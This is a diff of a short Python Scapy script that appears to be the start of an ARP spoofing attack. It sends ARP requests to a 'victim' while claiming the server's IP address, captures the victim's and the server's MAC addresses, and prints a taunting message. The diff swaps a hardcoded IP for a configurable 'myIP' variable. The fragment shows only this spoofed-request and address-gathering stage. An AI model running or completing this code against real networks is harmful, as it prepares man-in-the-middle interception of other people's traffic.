@@ -2,9 +2,10 @@
 
 from scapy.all import *
 
-myMAC = ""	#MAC
-victim = ""	#IP
-server = ""	#IP
+myIP = "" 	#my IP
+myMAC = ""	#my MAC
+victim = ""	#victim IP
+server = ""	#server IP
 
 packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=server,pdst=victim)
 answer = srp1(packet, timeout=1, verbose=False)
@@ -12,7 +13,7 @@ answer = srp1(packet, timeout=1, verbose=False)
 victimMAC = answer[ARP].hwsrc
 print("ahah :D vctm: " + victimMAC)
 
-packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc="192.168.22.40",pdst=server)
+packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=myIP ,pdst=server)
 answer2 = srp1(packet, timeout=1, verbose=False)
 
 serverMAC = answer2[ARP].hwsrc
